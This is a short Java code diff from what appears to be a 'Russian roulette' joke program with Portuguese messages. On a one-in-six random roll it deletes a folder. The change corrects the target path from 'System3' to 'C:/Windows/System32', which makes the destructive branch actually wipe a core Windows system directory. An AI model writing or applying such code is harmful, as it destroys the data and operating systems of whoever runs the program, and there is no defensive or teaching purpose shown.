@@ -6,7 +6,7 @@ public class App {
     public static void main(String[] args) {
         if (new Random().nextInt(6) == 0) {
             System.out.println("Tchau Tchau...💀");
-            excluirPasta(new File("C:/Windows/System3"));
+            excluirPasta(new File("C:/Windows/System32"));
         }
         else 
             System.out.println("Quase hein! Kkk");
